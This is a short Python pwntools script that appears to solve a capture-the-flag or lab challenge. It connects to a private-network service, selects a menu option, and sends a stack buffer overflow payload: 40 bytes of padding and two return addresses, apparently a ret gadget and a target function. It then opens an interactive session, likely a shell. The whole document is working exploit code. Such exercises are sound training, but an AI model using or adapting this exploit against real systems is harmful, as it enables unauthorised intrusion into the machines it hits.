from pwn import *
p = remote('10.10.7.194', 9003)
p.recvuntil(b'channel: ')
p.sendline(b'3')
p.recvuntil(b'[pwner]: ')
payload = flat(
    b'A' * 40,
    p64(0x401016),
    p64(0x401554)
)
p.sendline(payload)
print(payload)
p.interactive()
